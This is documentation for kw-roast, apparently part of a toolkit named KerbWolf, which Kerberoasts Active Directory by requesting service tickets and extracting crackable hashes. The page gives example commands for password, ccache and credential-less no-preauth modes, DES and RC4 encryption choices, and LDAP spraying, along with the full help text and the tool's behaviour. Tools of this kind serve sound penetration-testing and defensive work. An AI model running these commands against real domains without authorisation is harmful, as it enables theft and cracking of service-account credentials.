# kw-roast

TGS-REP Roast (Kerberoast). Request service tickets and extract crackable hashes.

Background on the attack is under [TGS-REP Roast](../background/attacks.md#tgs-rep-roast-kerberoast). Credentials, finding the DC, LDAP discovery and `-e` are shared with the other commands and described on [Common options](common-options.md).

## Examples

```bash
# LDAP auto-discovery with password auth
kw-roast -d CORP.LOCAL --dc-ip 10.0.0.1 -u admin -p 'Password1!' --ldap

# Kerberos auth from ccache (domain auto-detected)
kw-roast -k -c admin.ccache --ldap

# No-preauth kerberoasting (no credentials needed)
kw-roast -d CORP.LOCAL --dc-ip 10.0.0.1 --no-preauth vuln_user -t svc_sql

# Specific target, AES256
kw-roast -d CORP.LOCAL --dc-ip 10.0.0.1 -u admin -p pass -t MSSQLSvc/db01 -e aes256

# DES kerberoast (DES must be enabled in the DC's Kerberos encryption-types policy; not possible on Server 2025)
kw-roast -d CORP.LOCAL --dc-ip 10.0.0.1 -u admin -p pass --ldap -e des-cbc-md5
```

## Help

```
$ kw-roast -h
usage: kw-roast [-h] [--version] [-v] [--no-preauth USER] [-u USER] [-p PASS]
                [-H HASH] [-k] [-c FILE] [-d DOMAIN] [--dc-ip IP]
                [--dc-hostname HOST] [--transport {tcp,udp}]
                [--timeout TIMEOUT] [-t SPN/USER] [-T FILE] [--ldap]
                [--ldap-all] [--ldap-ssl] [-e ETYPE] [-o FILE]

TGS-REP Roast (Kerberoast) - request service tickets and extract hashes.

options:
  -h, --help            show this help message and exit
  --version             show program's version number and exit
  -v, --verbose         Increase verbosity (-v, -vv)

no-preauth mode (no credentials needed):
  Use a DONT_REQ_PREAUTH account to request service tickets via AS-REQ.

  --no-preauth USER     DONT_REQ_PREAUTH account for AS-REQ kerberoasting

NTLM authentication:
  Authenticate with password or NT hash to request a TGT, then use it for TGS requests.

  -u USER, --user USER  Username (sAMAccountName)
  -p PASS, --password PASS
                        Cleartext password
  -H HASH, --hashes HASH
                        NTLM hash - LM:NT, :NT, or NT

Kerberos authentication:
  Authenticate with an existing TGT from a ccache file. Domain and user are auto-detected from the ccache.

  -k, --kerberos        Use Kerberos auth via ccache
  -c FILE, --ccache FILE
                        CCache file with TGT (or set KRB5CCNAME)

connection:
  -d DOMAIN, --domain DOMAIN
                        Domain FQDN (auto-detected from ccache with -k)
  --dc-ip IP            DC IP or hostname (resolved via DNS SRV if omitted)
  --dc-hostname HOST    DC FQDN for Kerberos SPN (auto-detected if omitted)
  --transport {tcp,udp}
                        Transport protocol (default: tcp)
  --timeout TIMEOUT     Network timeout in seconds (default: 10)

targets:
  Specify targets manually, or use LDAP discovery (requires authentication).

  -t SPN/USER, --target SPN/USER
                        SPN, sAMAccountName, or UPN (repeatable)
  -T FILE, --targets-file FILE
                        File with targets, one per line (# comments, blank
                        lines skipped)
  --ldap                LDAP: discover accounts with servicePrincipalName set
  --ldap-all            LDAP: try every enabled user (spray)
  --ldap-ssl            Use LDAPS (port 636)

output:
  -e ETYPE, --enctype ETYPE
                        Encryption type(s) in preference order, repeatable or
                        comma-separated (choices: des-cbc-crc, des-cbc-md5,
                        rc4, aes128, aes256; default: rc4)
  -o FILE, --output FILE
                        Write hashes to file

Examples:
  kw-roast -d CORP.LOCAL --dc-ip 10.0.0.1 -u admin -p pass --ldap
  kw-roast -k -c admin.ccache --ldap
  kw-roast -d CORP.LOCAL --dc-ip 10.0.0.1 --no-preauth jsmith -t MSSQLSvc/db01
  kw-roast -d CORP.LOCAL -t svc_sql -t MSSQLSvc/db01.corp.local
```

## Behaviour

- **Targets.** `-t` takes an SPN, a sAMAccountName or a UPN. Anything containing `/` is treated as an SPN and anything else containing `@` as a UPN. KerbWolf requests each ticket by the account's sAMAccountName rather than by SPN, so an SPN or a UPN is first looked up in LDAP (`servicePrincipalName` or `userPrincipalName`) and replaced with the owning account's sAMAccountName, and that name is what goes in the TGS-REQ. `--ldap` returns sAMAccountNames directly.

    | Target given as | LDAP bind works and the name matches | No bind, or nothing matches |
    |---|---|---|
    | sAMAccountName | Sent as given | Sent as given |
    | SPN (contains `/`) | Replaced with the owning account's sAMAccountName | Sent as-is, and ends up in the user field of the hash |
    | UPN (contains `@`) | Replaced with the owning account's sAMAccountName | Sent as the part before the `@` |

- **The lookup needs a working LDAP bind.** It uses the same credentials as the roast (`-u` with `-p` or `-H`, or `-k`), so there is none with `--no-preauth`. A raw SPN in the user field is harmless for RC4, but an AES or DES hash then carries the wrong salt and will not crack until the user field is [corrected](../troubleshooting.md#correcting-a-line-by-hand). With `-k`, the bind goes through GSSAPI and needs the [Kerberos setup](../installation.md#kerberos-setup).
- **Salt check.** Before requesting tickets, each account-name target is probed with one AS-REQ without pre-authentication, and the salt in the KDC's answer (a `PREAUTH_REQUIRED` error, or an AS-REP for a `DONT_REQ_PREAUTH` account) supplies the exact spelling of the name, so the hash carries the salt the key was derived with. A target whose salt cannot be read keeps the name as given, except that a machine account's `NAME$` is written as `host<fqdn>` so that its `$` does not split the line; a warning is logged if the ticket is not RC4.
- **`-e` applies to the service ticket, not the TGT.** With `-u` and a password, kw-roast gets its own TGT offering AES256, AES128 and RC4; with `-H` it offers RC4 only. Which etype the ticket comes back with is the KDC's choice, described under [Encryption type selection](common-options.md#encryption-type-selection).
- **`--no-preauth`.** The targets go in the sname of an AS-REQ sent as the given `DONT_REQ_PREAUTH` account, so no credentials are needed.
- **Skipped targets.** A target the KDC refuses is skipped without a message; `-vv` shows them.

## Output

One `$krb5tgs$` line per ticket, labelled with the etype that came back. The mode for each etype is in the [mode matrix](../cracking/hash-reference.md#mode-matrix).

`-o` never overwrites. If the file exists, the hashes go to `name_1.ext`, then `name_2.ext`, and so on.
